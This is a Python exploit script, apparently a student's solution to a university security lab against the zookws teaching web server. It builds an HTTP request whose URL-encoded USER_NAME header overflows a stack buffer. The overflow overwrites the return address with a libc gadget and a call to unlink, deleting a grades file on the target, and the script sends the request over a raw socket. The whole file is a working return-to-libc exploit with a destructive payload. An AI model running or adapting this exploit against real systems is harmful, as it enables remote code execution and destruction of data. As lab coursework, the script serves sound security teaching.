#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.
libc_base = 0x1555552e1000
stack_buffer = 0x7fffffffda70
stack_retaddr = 0x7fffffffdc88
unlink_addr= 0x1555553f7250
gadget_addr = libc_base + 0x2a3e5
string_addr = 0x7fffffffdca0
## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode: bytes) -> bytes:
    ## Things that you might find useful in constructing your exploit:
    ##
    ##   urllib.parse.quote_from_bytes(s).encode('ascii')
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<Q", x)
    ##     returns the 8-byte binary encoding of the 64-bit integer x

    # req =   b"GET / HTTP/1.0\r\n" + \
    #         b"\r\n"
    # ret_addr = 0x7fffffffda70
    # print(len(shellcode))
    # padding_len= buffer_size - len(shellcode)
    # header_padding = shellcode+b"A"*padding_len + struct.pack("<Q", ret_addr)
    # encoded_padding = urllib.parse.quote(header_padding)  # URL encode to bypass checks

    header_padding=b"A"*(stack_retaddr-stack_buffer)+struct.pack("<Q",gadget_addr)+struct.pack("<Q",string_addr)+struct.pack("<Q",unlink_addr)+b"/home/student/grades.txt\x00"
    encoded_padding = urllib.parse.quote(header_padding)  

    req = f"GET /zoobar/templates/index.html HTTP/1.0\r\n"
    req += f"USER_NAME: {encoded_padding}\r\n"
    req += "\r\n"

    return req.encode() 

####

def send_req(host: str, port: int, req: bytes) -> bytes:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    try:
        rbuf = sock.recv(1024)
        resp = b""

        while len(rbuf):
            resp = resp + rbuf
            rbuf = sock.recv(1024)

        print("Received reply.")
    except ConnectionResetError:
        print("Connection closed by server")
    finally:
        sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

